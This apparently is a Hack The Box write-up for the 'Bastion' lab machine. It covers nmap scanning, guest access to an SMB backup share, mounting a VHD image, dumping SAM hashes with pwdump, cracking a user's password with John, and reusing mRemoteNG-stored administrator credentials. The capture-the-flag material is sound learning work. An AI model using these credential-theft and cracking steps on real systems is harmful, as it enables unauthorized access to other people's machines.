---
layout: single
title: Bastion - Hack The Box
excerpt: "Bastion was an easy box where we had to find an open SMB share that contained a Windows backup. Once we mounted the disk image file, we could recover the system and SAM hive and then crack one of the user's password. An OpenSSH service was installed on the machine so we could SSH in with the credentials and do further enumeration on the box. We then find a mRemoteNG configuration file that contains encrypted credentials for the administrator. The system flag blood was still up for grab when I reached that stage so instead of reversing the encryption for the configuration file I just installed the mRemoteNG application on a Windows VM, copied the config file over and was able to log in as administrator."
date: 2019-09-07
classes: wide
header:
  teaser: /assets/images/htb-writeup-bastion/bastion_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - windows
  - mremoteng
  - backup
  - smb
---

![](/assets/images/htb-writeup-bastion/bastion_logo.png)

Bastion was an easy box where we had to find an open SMB share that contained a Windows backup. Once we mounted the disk image file, we could recover the system and SAM hive and then crack one of the user's password. An OpenSSH service was installed on the machine so we could SSH in with the credentials and do further enumeration on the box. We then find a mRemoteNG configuration file that contains encrypted credentials for the administrator. The system flag blood was still up for grab when I reached that stage so instead of reversing the encryption for the configuration file I just installed the mRemoteNG application on a Windows VM, copied the config file over and was able to log in as administrator.

## Summary

- An open SMB share contains the full backup of a Windows machine
- The system and SAM hive can be recovered and then we can crack the `L4mpje` user hash
- mRemoteNG is installed and the credentials for the administrator are saved in the configuration file

## Tools used

- [https://github.com/libyal/libvhdi](https://github.com/libyal/libvhdi)

### Portscan

OpenSSH is running on the Windows machine. As this is not a standard Windows service, I make note of it as this might be needed to log in later when we find credentials.

```
# nmap -sC -sV -p- 10.10.10.134
Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-28 10:01 EDT
Nmap scan report for bastion.htb (10.10.10.134)
Host is up (0.0097s latency).
Not shown: 65522 closed ports
PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey:
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

### SMB share

There is a `Backups` SMB share that I have read and write to:
```
# smbmap -u invalid -H 10.10.10.134
[+] Finding open SMB ports....
[+] Guest SMB session established on 10.10.10.134...
[+] IP: 10.10.10.134:445	Name: bastion.htb
	Disk                                                  	Permissions
	----                                                  	-----------
	ADMIN$                                            	NO ACCESS
	Backups                                           	READ, WRITE
	C$                                                	NO ACCESS
	IPC$                                              	READ ONLY
```

Checking out the `Backups` share, I see a WindowImageBackup backup directory and `note.txt`:
```
smb: \> ls
  .                                   D        0  Sun Apr 28 10:04:03 2019
  ..                                  D        0  Sun Apr 28 10:04:03 2019
  note.txt                           AR      116  Tue Apr 16 06:10:09 2019
  SDT65CB.tmp                         A        0  Fri Feb 22 07:43:08 2019
  WindowsImageBackup                  D        0  Fri Feb 22 07:44:02 2019

		7735807 blocks of size 4096. 2780707 blocks available
```

The `note.txt` says I don't need to copy the entire backup file to our VM:
```
# cat note.txt

Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.
```

Instead of transferring all the files with smbclient I'll just mount the remote share:
```
# mount -t cifs //10.10.10.134/Backups /mnt/bastion
Password for root@//10.10.10.134/Backups:  *
# ls -l /mnt/bastion/
total 1
-r-xr-xr-x 1 root root 116 Apr 16 06:10 note.txt
-rwxr-xr-x 1 root root   0 Feb 22 07:43 SDT65CB.tmp
drwxr-xr-x 2 root root   0 Feb 22 07:44 WindowsImageBackup
```

The backup directory contains two `.vhd` files:
```
'/mnt/bastion/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351':
total 5330560
-rwxr-xr-x 1 root root   37761024 Feb 22 07:44 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
-rwxr-xr-x 1 root root 5418299392 Feb 22 07:45 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
```

I use the [vhdimount](https://github.com/libyal/libvhdi) utility to mount the remote `.vhd` file to another directory on my system. This way I don't have to download the entire file.

I just follow the build instructions at [https://github.com/libyal/libvhdi/wiki/Building](https://github.com/libyal/libvhdi/wiki/Building):

1. `apt install autoconf automake autopoint libtool pkg-config`
2. `./synclibs.sh`
3. `./autogen.sh`
4. `./configure`
5. `make`
6. `make install`
7. `ldconfig`

I can now mount the remote image:
```
# vhdimount /mnt/bastion/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd /mnt/vhd
vhdimount 20190309
```

It mounts a single file and not the actual contents:
```
# ls -l
total 0
-r--r--r-- 1 root root 15999492096 Apr 28 10:19 vhdi1
```

I then use the `mmls` utility to display the partition layout and calculate the offset of the partition: Block size x Start -> 512 * 128 = 65536
```
# mmls -aB vhdi1
DOS Partition Table
Offset Sector: 0
Units are in 512-byte sectors

      Slot      Start        End          Length       Size    Description
002:  000:000   0000000128   0031248511   0031248384   0014G   NTFS / exFAT (0x07)
```

Then I mount the image to another directory, specifying the proper offset:
```
# mount -o ro,noload,offset=65536 vhdi1 /mnt/bastion_backup
root@ragingunicorn:/mnt/vhd# ls -l /mnt/bastion_backup/
total 2096729
drwxrwxrwx 1 root root          0 Feb 22 07:39 '$Recycle.Bin'
-rwxrwxrwx 1 root root         24 Jun 10  2009  autoexec.bat
-rwxrwxrwx 1 root root         10 Jun 10  2009  config.sys
lrwxrwxrwx 2 root root         25 Jul 14  2009 'Documents and Settings' -> /mnt/bastion_backup/Users
-rwxrwxrwx 1 root root 2147016704 Feb 22 07:38  pagefile.sys
drwxrwxrwx 1 root root          0 Jul 13  2009  PerfLogs
drwxrwxrwx 1 root root       4096 Jul 14  2009  ProgramData
drwxrwxrwx 1 root root       4096 Apr 11  2011 'Program Files'
drwxrwxrwx 1 root root          0 Feb 22 07:39  Recovery
drwxrwxrwx 1 root root       4096 Feb 22 07:43 'System Volume Information'
drwxrwxrwx 1 root root       4096 Feb 22 07:39  Users
drwxrwxrwx 1 root root      16384 Feb 22 07:40  Windows
```

I now have access to the system and SAM hive and I dump the hashes from the database:
```
/mnt/bastion_backup/Windows/System32/config# pwdump SYSTEM SAM
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
```

With John The Ripper I can crack the hash for user `L4mpje`: `bureaulampje`
```
# john --format=NT -w=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (NT [MD4 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
                 (Administrator)
bureaulampje     (L4mpje)
```

With that account I can SSH in and get the user flag:
```
# ssh l4mpje@10.10.10.134
l4mpje@10.10.10.134's password:

Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

l4mpje@BASTION C:\Users\L4mpje>cd desktop

l4mpje@BASTION C:\Users\L4mpje\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 0CB3-C487

 Directory of C:\Users\L4mpje\Desktop

22-02-2019  16:27    <DIR>          .
22-02-2019  16:27    <DIR>          ..
23-02-2019  10:07                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)  11.389.775.872 bytes free

l4mpje@BASTION C:\Users\L4mpje\Desktop>type user.txt
9bfe57...
```

### Getting the administrator credentials

I do some recon and found the mRemoteNG application is installed on the system. mRemoteNG is a multi-protocol connection manager and allows users to connect to systems with different protocols like SSH, RDP, VNC, etc. As such, it supports saving the credentials locally in a configuration file.

The XML configuration file is located here: `C:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml`

I immediately see that it contains an RDP session configuration for user `Administrator`:
```
<Node Name="DC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General"
Id="500e7d58-662a-44d4-aff0-3a4f547a3fee" Username="Administrator" Domain=""
Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="
Hostname="127.0.0.1"
[...]
```

The password is encrypted with AES in GCM mode with a hardcoded key in the .xml file, then base64 encoded. Because I was under time pressure to get the system flag, I decided to spin up a Windows VM and install mRemoteNG instead of trying to find a way to recover the password. I found some ruby script on packetstorm that decrypts the password but it only works for CBC mode and therefore was of no use for me here.

I didn't want to turn off my VPN connection from my Kali VM so I just routed my Commando VM to my Kali VM and natted out the connection to the HTB lab.

Added a route in Windows:
```
C:\Users\snowscan>route add 10.10.10.0 mask 255.255.255.0 172.23.10.39
 OK!
```

Then added a NAT statement in Kali after enabling IPv4 routing:
```
# echo 1 > /proc/sys/net/ipv4/ip_forward
# /sbin/iptables -t nat -A POSTROUTING -o tun0 -j MASQUERADE
# /sbin/iptables -A FORWARD -i eth0 -o tun0 -j ACCEPT
```

Testing connectivity from Commando VM:
```
C:\Users\snowscan>nc -nv 10.10.10.134 22
(UNKNOWN) [10.10.10.134] 22 (?) open
SSH-2.0-OpenSSH_for_Windows_7.9
```

I installed mRemoteNG portable edition then replaced the `confCons.xml` with the one from the box. I then changed the Protocol from RDP to SSH:

![](/assets/images/htb-writeup-bastion/mremoteng1.png)

I can connect with the administrator credentials and get the system flag:

![](/assets/images/htb-writeup-bastion/mremoteng2.png)
